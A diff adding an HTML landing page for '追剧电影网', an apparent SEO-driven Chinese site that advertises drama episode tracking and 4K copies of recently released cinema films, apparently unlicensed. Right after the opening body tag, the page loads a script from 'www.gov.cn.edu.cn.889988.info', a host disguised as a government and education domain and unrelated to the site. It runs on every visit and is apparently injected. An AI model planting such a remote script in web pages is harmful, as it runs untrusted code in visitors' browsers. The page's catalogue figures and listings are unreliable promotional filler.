@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>追剧电影网——热门剧集与院线大片同步追更入口 · zhuijudianyingwang-zh.github.io</title>
+<meta name="description" content="追剧电影网（zhuijudianyingwang-zh.github.io）是面向追剧党与影迷的影视内容聚合平台，覆盖热播剧集同步追更、院线大片在线观看、综艺动漫纪录片专区及下周定档预告。智能分季分集索引、更新时间提醒、多端画质自适应，一次登录全端同步，不错过任何一集。">
+<meta name="keywords" content="追剧电影网, zhuijudianyingwang-zh.github.io, 追剧网, 热播剧集在线观看, 剧集同步追更, 院线大片, 下周定档预告, 分集索引, 影视内容聚合平台">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="language" content="zh-CN">
+<meta name="author" content="追剧电影网">
+<meta name="copyright" content="© 2026 追剧电影网">
+<meta name="theme-color" content="#0f766e">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="追剧电影网——热门剧集与院线大片同步追更入口">
+<meta property="og:description" content="热播剧集同步追更、院线大片在线观看、综艺动漫纪录片专区及下周定档预告一站直达。">
+<meta property="og:url" content="https://zhuijudianyingwang-zh.github.io">
+<meta property="og:site_name" content="追剧电影网">
+<link rel="canonical" href="https://zhuijudianyingwang-zh.github.io">
+<style>
+:root{
+  --teal:#0f766e;
+  --teal-d:#0b5a53;
+  --teal-l:#14a89c;
+  --mint:#ccfbf1;
+  --orange:#ea580c;
+  --amber:#f59e0b;
+  --ink:#12201e;
+  --ink-2:#52645f;
+  --bg:#f0faf8;
+  --paper:#fff;
+  --line:#d9e8e5;
+  --r:14px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;font-size:15.5px;
+}
+a{color:inherit;text-decoration:none}
+button{font-family:inherit;cursor:pointer;border:0;background:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+.sr{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
+
+/* ===== Announcement ticker ===== */
+.ticker{background:var(--teal-d);color:#99e2d8;font-size:13px;border-bottom:1px solid rgba(255,255,255,.08)}
+.ticker .wrap{display:flex;align-items:center;gap:14px;height:38px}
+.ticker .tag{flex:0 0 auto;background:var(--orange);color:#fff;font-weight:700;font-size:11.5px;padding:3px 10px;border-radius:4px;letter-spacing:1px}
+.ticker .txt{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ticker .txt b{color:#fff;font-weight:600}
+
+/* ===== Header ===== */
+header{background:var(--paper);border-bottom:3px solid var(--teal);position:sticky;top:0;z-index:60}
+.h-in{max-width:1180px;margin:0 auto;padding:0 20px;display:flex;align-items:center;justify-content:space-between;height:70px;gap:24px}
+.logo{display:flex;align-items:center;gap:11px}
+.logo .badge{
+  width:40px;height:40px;border-radius:10px;flex:0 0 40px;
+  background:var(--teal);color:#fff;display:grid;place-items:center;font-weight:900;font-size:19px;
+}
+.logo .txt{line-height:1.15}
+.logo .txt b{font-size:21px;letter-spacing:.5px}
+.logo .txt span{display:block;font-size:10.5px;color:var(--ink-2);letter-spacing:1.5px}
+.nav{display:flex;align-items:center;gap:4px}
+.nav a{font-size:14.5px;padding:9px 13px;border-radius:8px;color:var(--ink-2);transition:.16s}
+.nav a:hover{background:var(--mint);color:var(--teal-d)}
+.nav a.act{background:var(--teal);color:#fff}
+.mob{display:none;font-size:25px;color:var(--teal);padding:4px 6px}
+.sub{background:#e6f7f4;border-top:1px solid var(--line);font-size:12.5px;color:var(--teal-d)}
+.sub .wrap{display:flex;gap:18px;height:34px;align-items:center;overflow:auto;white-space:nowrap}
+.sub a{color:var(--teal-d);opacity:.85}
+.sub a:hover{opacity:1;text-decoration:underline;text-underline-offset:3px}
+.sub em{font-style:normal;color:var(--orange);font-weight:700}
+
+/* ===== Hero ===== */
+.hero{background:var(--teal);color:#fff;position:relative;overflow:hidden}
+.hero:before{content:"";position:absolute;inset:0;background:
+  radial-gradient(700px 360px at 82% 18%,rgba(234,88,12,.35),transparent 60%),
+  radial-gradient(500px 300px at 8% 92%,rgba(20,168,156,.55),transparent 60%)}
+.hero .wrap{position:relative;padding-top:60px;padding-bottom:60px;display:grid;grid-template-columns:.95fr 1fr;gap:48px;align-items:center}
+.hero .crumbs{font-size:12.5px;color:#99e2d8;margin-bottom:14px}
+.hero .crumbs a{color:#fff}
+.hero h1{font-size:43px;line-height:1.2;font-weight:900;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:#ffd9a0}
+.hero .subt{color:#d4f2ed;font-size:16px;max-width:480px;margin-bottom:24px}
+.h-stat{display:flex;gap:34px;flex-wrap:wrap;margin-bottom:26px}
+.h-stat div b{display:block;font-size:27px;font-family:Georgia,serif;color:#ffd9a0;line-height:1.2}
+.h-stat div span{font-size:12.5px;color:#a8ddd5}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.hero .acts a{font-weight:700;font-size:15px;padding:13px 26px;border-radius:10px;transition:.2s}
+.hero .acts .pri{background:var(--orange);color:#fff}
+.hero .acts .pri:hover{background:#c2410c;transform:translateY(-2px)}
+.hero .acts .sec{border:1.5px solid rgba(255,255,255,.55);color:#fff}
+.hero .acts .sec:hover{background:#fff;color:var(--teal-d)}
+
+/* hero cards */
+.h-cards{display:grid;gap:14px}
+.h-card{
+  background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.22);
+  border-radius:var(--r);padding:18px 20px;backdrop-filter:blur(4px);transition:.2s;
+}
+.h-card:hover{background:rgba(255,255,255,.2);transform:translateX(6px)}
+.h-card .row1{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:8px}
+.h-card .row1 b{font-size:16.5px}
+.h-card .row1 span{font-size:11.5px;color:#ffd9a0;flex:0 0 auto}
+.h-card p{font-size:13.5px;color:#d4f2ed}
+.h-card .bar{height:5px;border-radius:4px;background:rgba(255,255,255,.2);margin-top:12px;overflow:hidden}
+.h-card .bar i{display:block;height:100%;border-radius:4px;background:linear-gradient(90deg,#f59e0b,#ea580c)}
+
+/* ===== Section frame ===== */
+section{padding:66px 0}
+.sec-t{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:30px;flex-wrap:wrap;border-bottom:2px solid var(--line);padding-bottom:14px}
+.sec-t h2{font-size:27px;font-weight:900;display:flex;align-items:center;gap:10px}
+.sec-t h2 i{font-style:normal;color:var(--orange);font-family:Georgia,serif;font-size:24px}
+.sec-t .more{font-size:13.5px;color:var(--teal);font-weight:700}
+.sec-t .more:hover{color:var(--orange)}
+.sec-t .note{font-size:13.5px;color:var(--ink-2);max-width:420px;text-align:right}
+
+/* ===== 6-col block grid ===== */
+.blocks{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.block{background:var(--paper);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.22s;display:flex;flex-direction:column}
+.block:hover{border-color:var(--teal-l);box-shadow:0 14px 30px rgba(15,118,110,.13);transform:translateY(-5px)}
+.block .cap{height:104px;padding:16px 18px;color:#fff;display:flex;flex-direction:column;justify-content:space-between}
+.block .cap b{font-size:19px}
+.block .cap small{font-size:12px;opacity:.9}
+.block .cap span{font-size:11.5px;align-self:flex-start;background:rgba(255,255,255,.25);padding:2px 9px;border-radius:20px}
+.block .body{padding:16px 18px;flex:1;display:flex;flex-direction:column}
+.block .body p{font-size:13.5px;color:var(--ink-2);flex:1}
+.block .body .ft{display:flex;justify-content:space-between;align-items:center;margin-top:14px;font-size:12.5px;color:var(--ink-2);border-top:1px dashed var(--line);padding-top:12px}
+.block .body .ft a{color:var(--teal);font-weight:700}
+.block .body .ft a:hover{color:var(--orange)}
+
+/* ===== Schedule timeline ===== */
+.tl{background:#e6f7f4}
+.track{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;background:var(--paper)}
+.track .day{padding:20px 18px;border-right:1px solid var(--line);position:relative}
+.track .day:last-child{border-right:0}
+.track .day:nth-child(even){background:#f7fdfc}
+.track .day b{display:block;color:var(--orange);font-size:13px;letter-spacing:1px}
+.track .day .d{font-family:Georgia,serif;font-size:30px;font-weight:900;color:var(--teal-d);line-height:1.1}
+.track .day ul{list-style:none;margin-top:12px;display:grid;gap:8px}
+.track .day li{font-size:13px;padding-left:11px;position:relative;color:var(--ink-2)}
+.track .day li:before{content:"";position:absolute;left:0;top:8px;width:4px;height:4px;border-radius:50%;background:var(--teal-l)}
+.track .day li.hot{color:var(--ink);font-weight:600}
+.track .day li.hot:before{background:var(--orange)}
+
+/* ===== Split content ===== */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:start}
+.vs{font-family:Georgia,serif;font-weight:900;font-size:15px;color:#fff;background:var(--orange);width:34px;height:34px;border-radius:50%;display:grid;place-items:center;margin:0 auto 6px}
+.box{background:var(--paper);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.box .hd{padding:14px 20px;font-weight:800;font-size:16px;color:#fff;display:flex;justify-content:space-between;align-items:center}
+.box .hd small{font-size:11.5px;font-weight:400;opacity:.9}
+.box ol,.box ul{list-style:none;padding:8px 0}
+.box li{padding:13px 20px;border-bottom:1px solid var(--line);display:flex;gap:14px;align-items:flex-start;transition:.15s}
+.box li:last-child{border-bottom:0}
+.box li:hover{background:#f7fdfc}
+.box li .no{flex:0 0 26px;height:26px;border-radius:7px;background:var(--mint);color:var(--teal-d);display:grid;place-items:center;font-weight:800;font-size:13px}
+.box li.top .no{background:var(--orange);color:#fff}
+.box li .tx{flex:1;min-width:0}
+.box li .tx b{font-size:15px;display:block}
+.box li .tx small{color:var(--ink-2);font-size:12.5px}
+.box li .ep{font-size:12px;color:var(--teal);background:var(--mint);padding:3px 10px;border-radius:20px;flex:0 0 auto;align-self:center;font-weight:600}
+
+/* ===== FAQ ===== */
+.faq{display:grid;gap:12px;max-width:900px}
+details{background:var(--paper);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.2s}
+details[open]{border-color:var(--teal-l);box-shadow:0 8px 22px rgba(15,118,110,.1)}
+details summary{padding:18px 22px;cursor:pointer;font-weight:700;font-size:16px;list-style:none;display:flex;justify-content:space-between;gap:16px;align-items:center}
+details summary::-webkit-details-marker{display:none}
+details summary:after{content:"+";color:var(--teal);font-size:22px;font-weight:400;flex:0 0 auto}
+details[open] summary:after{content:"−"}
+details .an{padding:0 22px 20px;border-top:1px solid var(--line);margin-top:-2px;padding-top:16px;color:var(--ink-2);font-size:14.5px}
+details .an a{color:var(--teal);font-weight:700;border-bottom:1px solid var(--amber)}
+
+/* ===== Quote band ===== */
+.quote{background:var(--teal-d);color:#fff;text-align:center;padding:48px 20px}
+.quote .wrap{max-width:820px}
+.quote h3{font-size:24px;font-weight:800;margin-bottom:14px}
+.quote p{color:#cdead3;font-size:15px;margin-bottom:22px}
+.quote .u{display:inline-block;background:var(--orange);color:#fff;font-weight:800;padding:13px 30px;border-radius:10px;font-size:15px;transition:.2s}
+.quote .u:hover{background:#fff;color:var(--teal-d)}
+
+/* ===== Footer ===== */
+footer{background:#0b3d38;color:#9fcbbf;padding:52px 0 24px}
+.f-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:32px}
+.f-grid b.ft{color:#fff;font-size:14.5px;display:block;margin-bottom:13px}
+.f-grid ul{list-style:none;display:grid;gap:9px}
+.f-grid a{font-size:13.5px}
+.f-grid a:hover{color:#ffd9a0}
+.f-brand b{font-size:20px;color:#fff;display:block;margin-bottom:9px}
+.f-brand p{font-size:13.5px;max-width:300px}
+.f-brand .addr{margin-top:14px;font-size:13px;background:rgba(255,255,255,.07);display:inline-block;padding:7px 12px;border-radius:8px;border-left:3px solid var(--orange)}
+.f-bot{border-top:1px solid rgba(255,255,255,.1);padding-top:20px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px}
+.f-bot .kw{color:#ffd9a0}
+
+/* ===== Responsive ===== */
+@media(max-width:960px){
+  .hero .wrap{grid-template-columns:1fr;gap:38px}
+  .hero h1{font-size:34px}
+  .blocks{grid-template-columns:1fr 1fr}
+  .track{grid-template-columns:1fr 1fr}
+  .track .day:nth-child(2){border-right:0}
+  .split{grid-template-columns:1fr}
+  .f-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  section{padding:48px 0}
+  .hero .wrap{padding-top:40px;padding-bottom:44px}
+  .hero h1{font-size:28px}
+  .mob{display:block}
+  .nav{position:absolute;top:70px;left:0;right:0;flex-direction:column;align-items:stretch;background:#fff;padding:10px;border-bottom:3px solid var(--teal);display:none;box-shadow:0 12px 24px rgba(0,0,0,.1)}
+  .nav.open{display:flex}
+  .nav a{padding:12px 14px;border-radius:6px}
+  .h-stat{gap:24px}
+  .blocks{grid-template-columns:1fr}
+  .track{grid-template-columns:1fr}
+  .track .day{border-right:0;border-bottom:1px solid var(--line)}
+  .track .day:last-child{border-bottom:0}
+  .f-grid{grid-template-columns:1fr}
+  .sec-t .note{text-align:left}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="ticker">
+  <div class="wrap">
+    <span class="tag">站 内 动 态</span>
+    <span class="txt"><b>本周新增</b> 院线大片 9 部、热播剧集 12 部、经典修复 18 部 · 全站内容分集索引已完成同步</span>
+  </div>
+</div>
+
+<header>
+  <div class="h-in">
+    <a class="logo" href="#top">
+      <span class="badge">追</span>
+      <span class="txt">追剧电影网<small>ZHUIJU · 同步追更</small></span>
+    </a>
+    <nav class="nav" id="nav">
+      <a href="#top" class="act">首页</a>
+      <a href="#shows">热播剧集</a>
+      <a href="#movies">院线大片</a>
+      <a href="#schedule">定档日历</a>
+      <a href="#channels">内容频道</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="mob" id="mob" aria-label="菜单">☰</button>
+  </div>
+  <div class="sub">
+    <div class="wrap">
+      <a href="#shows">正在热播</a><span>·</span>
+      <a href="#schedule">本周定档</a><span>·</span>
+      <a href="#movies">院线同步</a><span>·</span>
+      <a href="#">高分口碑</a><span>·</span>
+      <a href="#">经典重温</a><span>·</span>
+      <a href="#">动漫专区</a><span>·</span>
+      <a href="#">纪录片</a><span>·</span>
+      <a href="#about">官方入口：<em>zhuijudianyingwang-zh.github.io</em></a>
+    </div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero" style="padding:0">
+    <div class="wrap">
+      <div>
+        <div class="crumbs"><a href="#top">追剧电影网</a> › 影视内容聚合 › <span style="color:#ffd9a0">同步追更</span></div>
+        <h1>追剧不落集<br>大片不漏档<br><em>一站追到尾</em></h1>
+        <p class="subt">追剧电影网（zhuijudianyingwang-zh.github.io）把热播剧集的更新进度、院线大片的同步上线、以及未来两周的定档预告，汇总到同一个页面。</p>
+        <div class="h-stat">
+          <div><b>4,800+</b><span>入库剧集</span></div>
+          <div><b>2,200+</b><span>院线大片</span></div>
+          <div><b>30 分钟</b><span>榜单刷新</span></div>
+        </div>
+        <div class="acts">
+          <a class="pri" href="#shows">查看今日热播</a>
+          <a class="sec" href="#schedule">翻看定档日历</a>
+        </div>
+      </div>
+      <div class="h-cards">
+        <div class="h-card">
+          <div class="row1"><b>正在热播 · 本周榜首</b><span>更新至 24 集</span></div>
+          <p>长安十二时 · 古装悬疑，全 36 集，每周三四 20:00 双更，当前播放进度领先全网</p>
+          <div class="bar"><i style="width:67%"></i></div>
+        </div>
+        <div class="h-card">
+          <div class="row1"><b>院线同步 · 刚刚上线</b><span>今日新增</span></div>
+          <p>极速追凶 II · 动作犯罪片，院线下映后第 3 天即完成入库，支持 4K 清晰度</p>
+          <div class="bar"><i style="width:92%"></i></div>
+        </div>
+        <div class="h-card">
+          <div class="row1"><b>下周定档 · 重点关注</b><span>10 月 16 日</span></div>
+          <p>深海来信 第二季 · 科幻剧情剧，全 10 集一次性上线，首日热度预估破 90</p>
+          <div class="bar"><i style="width:45%"></i></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CHANNELS -->
+  <section id="channels">
+    <div class="wrap">
+      <div class="sec-t">
+        <h2><i>01</i>六大内容频道</h2>
+        <span class="note">从正在追的剧到刚下映的片，每个频道都有独立的更新节奏与检索逻辑。</span>
+      </div>
+      <div class="blocks">
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#0f766e,#14a89c)"><span>本周热播</span><b>热播剧集</b><small>分集索引 / 更新提醒</small></div>
+          <div class="body"><p>国产剧、美剧、日韩剧分榜排序，每集更新时间与播放进度一目了然，支持标记"已看"。</p><div class="ft"><span>每日更新</span><a href="#shows">进入频道 →</a></div></div>
+        </article>
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#7c3aed,#a855f7)"><span>同步入库</span><b>院线大片</b><small>4K / 1080P / 720P</small></div>
+          <div class="body"><p>院线新片下映后第一时间入库，按类型、地区、年代三维检索，清晰度档位自选。</p><div class="ft"><span>每周补充</span><a href="#movies">进入频道 →</a></div></div>
+        </article>
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#b45309,#f59e0b)"><span>每日更新</span><b>综艺专区</b><small>分季分集 / 字幕版</small></div>
+          <div class="body"><p>国内外热门综艺分季归档，新一期上线即同步，支持按嘉宾与题材筛选。</p><div class="ft"><span>每日更新</span><a href="#">进入频道 →</a></div></div>
+        </article>
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#0369a1,#0ea5e9)"><span>连载中</span><b>动漫番剧</b><small>周更 / 完结库</small></div>
+          <div class="body"><p>新番周更时间表与经典完结作分开管理，动画电影单列成区，进度自动记忆。</p><div class="ft"><span>每周更新</span><a href="#">进入频道 →</a></div></div>
+        </article>
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#15803d,#4ade80)"><span>持续扩充</span><b>纪录片库</b><small>自然 / 历史 / 科技</small></div>
+          <div class="body"><p>高分纪实影像按主题归类，含系列套装与单集精选，适合深度观看。</p><div class="ft"><span>每月更新</span><a href="#">进入频道 →</a></div></div>
+        </article>
+        <article class="block">
+          <div class="cap" style="background:linear-gradient(135deg,#be123c,#fb7185)"><span>预告日历</span><b>即将上线</b><small>未来两周定档</small></div>
+          <div class="body"><p>未来两周所有定档新片与开播剧集统一陈列，支持开播前订阅提醒。</p><div class="ft"><span>日历视图</span><a href="#schedule">进入频道 →</a></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCHEDULE -->
+  <section class="tl" id="schedule">
+    <div class="wrap">
+      <div class="sec-t">
+        <h2><i>02</i>未来两周定档日历</h2>
+        <span class="note">点开任意一天，看清楚那天到底有哪些新剧开播、哪些大片上线。</span>
+      </div>
+      <div class="track">
+        <div class="day">
+          <b>本周三</b><div class="d">10.14</div>
+          <ul>
+            <li class="hot">长安十二时 · 更新 25-26 集</li>
+            <li>午夜接线员 · 首播 4 集</li>
+            <li>小满的夏天 · 更新 12 集</li>
+          </ul>
+        </div>
+        <div class="day">
+          <b>本周四</b><div class="d">10.15</div>
+          <ul>
+            <li>逆光而行 · 更新 8-9 集</li>
+            <li class="hot">法医笔记 · 更新 11 集</li>
+            <li>综艺《七日挑战》新一期</li>
+          </ul>
+        </div>
+        <div class="day">
+          <b>下周二</b><div class="d">10.20</div>
+          <ul>
+            <li class="hot">深海来信 第二季 · 全集上线</li>
+            <li>院线《山野的回声》同步入库</li>
+            <li>动漫《星轨》新番开播</li>
+          </ul>
+        </div>
+        <div class="day">
+          <b>下周六</b><div class="d">10.24</div>
+          <ul>
+            <li>纪录片《冰川纪事》首更 3 集</li>
+            <li>经典修复《大话西游》上线</li>
+            <li class="hot">悬疑剧《回声》首播 6 集</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SPLIT: SHOWS vs MOVIES -->
+  <section id="shows">
+    <div class="wrap">
+      <div class="sec-t">
+        <h2><i>03</i>今日追更榜 vs 院线同步榜</h2>
+        <a class="more" href="#channels">查看全部频道 →</a>
+      </div>
+      <div class="split">
+        <div class="box">
+          <div class="hd" style="background:#0f766e">正在热播 · 剧集更新榜<small>每集进度可见</small></div>
+          <ol>
+            <li class="top"><span class="no">1</span><span class="tx"><b>长安十二时</b><small>古装悬疑 · 36 集 · 已更 24 集</small></span><span class="ep">追至 24</span></li>
+            <li class="top"><span class="no">2</span><span class="tx"><b>法医笔记</b><small>悬疑刑侦 · 32 集 · 已更 11 集</small></span><span class="ep">追至 9</span></li>
+            <li><span class="no">3</span><span class="tx"><b>小满的夏天</b><small>青春爱情 · 24 集 · 已更 12 集</small></span><span class="ep">追至 12</span></li>
+            <li><span class="no">4</span><span class="tx"><b>逆光而行</b><small>都市治愈 · 28 集 · 已更 9 集</small></span><span class="ep">追至 7</span></li>
+            <li><span class="no">5</span><span class="tx"><b>午夜接线员</b><small>惊悚悬疑 · 18 集 · 首播 4 集</small></span><span class="ep">追至 4</span></li>
+            <li><span class="no">6</span><span class="tx"><b>山野的回声</b><small>文艺剧情 · 12 集 · 已更 7 集</small></span><span class="ep">追至 6</span></li>
+          </ol>
+        </div>
+        <div>
+          <div class="vs">VS</div>
+          <div class="box">
+            <div class="hd" style="background:#b45309">院线同步 · 新片入库榜<small>清晰度可选</small></div>
+            <ul>
+              <li class="top"><span class="no">1</span><span class="tx"><b>极速追凶 II</b><small>动作犯罪 · 4K / 1080P / 720P</small></span><span class="ep">4K</span></li>
+              <li class="top"><span class="no">2</span><span class="tx"><b>深海来信</b><small>科幻剧情 · 4K 杜比音轨</small></span><span class="ep">4K</span></li>
+              <li><span class="no">3</span><span class="tx"><b>逆光而行（电影版）</b><small>爱情治愈 · 1080P</small></span><span class="ep">1080P</span></li>
+              <li><span class="no">4</span><span class="tx"><b>午夜接线员：暗线</b><small>惊悚悬疑 · 1080P</small></span><span class="ep">1080P</span></li>
+              <li><span class="no">5</span><span class="tx"><b>山野的回声</b><small>文艺剧情 · 4K 修复版</small></span><span class="ep">4K</span></li>
+              <li><span class="no">6</span><span class="tx"><b>大话西游（4K 修复）</b><small>经典重温 · 4K 重制</small></span><span class="ep">4K</span></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section id="faq" style="background:#e6f7f4">
+    <div class="wrap">
+      <div class="sec-t">
+        <h2><i>04</i>常见问题</h2>
+        <span class="note">如果下面没有你的问题，可以在页面底部提交反馈，通常 24 小时内回复。</span>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>追剧电影网是哪个网站？网址是什么？</summary>
+          <div class="an">追剧电影网是一家影视内容聚合平台，官方网址为 <a href="https://zhuijudianyingwang-zh.github.io">https://zhuijudianyingwang-zh.github.io</a>。请认准这个域名，避免进入仿冒站点。</div>
+        </details>
+        <details>
+          <summary>剧集更新时间是怎么确定的？</summary>
+          <div class="an">每集更新时间与播出平台保持一致，系统每 30 分钟校验一次；遇到平台临时调整排期，会同步更新定档日历并标注"时间变动"。</div>
+        </details>
+        <details>
+          <summary>支持哪些设备与分辨率？</summary>
+          <div class="an">手机、平板、电脑浏览器均可访问，页面为响应式布局，会根据屏幕宽度自动调整版式。清晰度支持 4K、1080P、720P 三档，弱网环境下可自动降档。</div>
+        </details>
+        <details>
+          <summary>观看进度能在不同设备间同步吗？</summary>
+          <div class="an">可以。同一账号下，手机、平板、电脑的观看进度自动同步，切换设备时从中断处继续，无需手动记录集数。</div>
+        </details>
+        <details>
+          <summary>未来两周定档日历在哪里看？</summary>
+          <div class="an">在页面上方点击"定档日历"，即可看到未来两周的开播与上线安排，热门项目会用橙色标记，也支持开播前订阅提醒。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- QUOTE -->
+  <section class="quote">
+    <div class="wrap">
+      <h3>把"今天看什么"这件事，交给我们</h3>
+      <p>追剧电影网（zhuijudianyingwang-zh.github.io）—— 热播剧集同步追更，院线大片不漏档，定档预告提前知道。</p>
+      <a class="u" href="https://zhuijudianyingwang-zh.github.io">立即访问追剧电影网</a>
+    </div>
+  </section>
+
+  <!-- ABOUT -->
+  <section id="about">
+    <div class="wrap">
+      <div class="sec-t">
+        <h2><i>05</i>关于本站</h2>
+        <a class="more" href="#top">回到顶部 ↑</a>
+      </div>
+      <div style="background:#fff;border:1px solid var(--line);border-left:5px solid var(--orange);border-radius:var(--r);padding:30px 30px;max-width:900px">
+        <p style="margin-bottom:14px">追剧电影网（zhuijudianyingwang-zh.github.io）面向两类人：一类是追剧追到一半怕漏集的观众，一类是想在院线大片下映后第一时间找到正片入口的影迷。平台把"更新到第几集""哪天开播""什么时间上线"这三件事做成核心功能，而不是把内容简单堆成一个目录。</p>
+        <p style="margin-bottom:14px">目前平台内容分为热播剧集、院线大片、综艺专区、动漫番剧、纪录片库、即将上线六个频道，覆盖剧集、电影、综艺、动漫、纪录片五种形态。片库每日补充，榜单每 30 分钟刷新，定档日历覆盖未来两周。</p>
+        <p>官方入口只有一个：<strong style="color:var(--teal)">https://zhuijudianyingwang-zh.github.io</strong>。建议收藏该网址，以免误入相似域名的仿冒站点。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-brand">
+        <b>追剧电影网</b>
+        <p>热门剧集与院线大片同步追更入口，专注"更新进度、上线时间、定档预告"三件事。</p>
+        <div class="addr">zhuijudianyingwang-zh.github.io</div>
+      </div>
+      <div>
+        <b class="ft">内容频道</b>
+        <ul>
+          <li><a href="#shows">热播剧集</a></li>
+          <li><a href="#movies">院线大片</a></li>
+          <li><a href="#">综艺专区</a></li>
+          <li><a href="#">动漫番剧</a></li>
+        </ul>
+      </div>
+      <div>
+        <b class="ft">功能服务</b>
+        <ul>
+          <li><a href="#schedule">定档日历</a></li>
+          <li><a href="#">分集索引</a></li>
+          <li><a href="#">更新提醒</a></li>
+          <li><a href="#">多端同步</a></li>
+        </ul>
+      </div>
+      <div>
+        <b class="ft">站点信息</b>
+        <ul>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#">提交反馈</a></li>
+          <li><a href="#">官方入口</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="f-bot">
+      <span>© 2026 追剧电影网 · 网站名称：追剧电影网 · 网站网址：<span class="kw">https://zhuijudianyingwang-zh.github.io</span></span>
+      <span>覆盖类型：电影 / 剧集 / 综艺 / 动漫 / 纪录片</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var mb=document.getElementById('mob');
+var nav=document.getElementById('nav');
+mb.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open');});
+</script>
+</body>
+</html>
